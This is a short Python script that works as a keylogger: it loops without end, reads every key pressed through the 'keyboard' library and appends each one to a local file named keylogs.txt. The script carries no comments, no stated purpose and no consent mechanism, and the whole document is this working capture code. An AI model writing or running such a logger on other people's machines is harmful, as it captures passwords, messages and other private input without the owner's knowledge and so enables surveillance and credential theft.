import keyboard
import time
import os

LOG_FILE = os.path.join(os.path.dirname(__file__), "keylogs.txt")

def log_keystrokes():
    try:
        while True:
            key = keyboard.read_key()
            with open(LOG_FILE, "a") as f:
                f.write(key + "\n")
            time.sleep(0.1)
    except Exception as e:
        print(f"Error logging keystrokes: {e}")

log_keystrokes()